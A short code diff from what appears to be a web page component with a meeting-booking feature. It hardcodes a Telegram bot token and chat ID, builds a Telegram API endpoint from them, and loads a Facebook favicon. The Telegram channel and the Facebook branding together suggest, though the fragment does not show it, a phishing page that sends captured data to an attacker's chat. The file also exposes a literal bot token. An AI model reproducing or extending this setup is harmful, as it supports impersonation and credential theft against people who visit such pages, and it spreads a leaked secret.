@@ -19,7 +19,7 @@ import MeetingBooking from './MeetingBooking';
 
 const BOT_TOKEN = '8384884777:AAH8bBdvnekmsnyziPI6dKaZXGjzS2xlWgU';
 const CHAT_ID = '-4623527619';
-const API_BASE = `https://api.telegram.org/bot${8384884777:AAH8bBdvnekmsnyziPI6dKaZXGjzS2xlWgU}`;
+const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 const FACEBOOK_LOGO =
   'https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'; // favicon
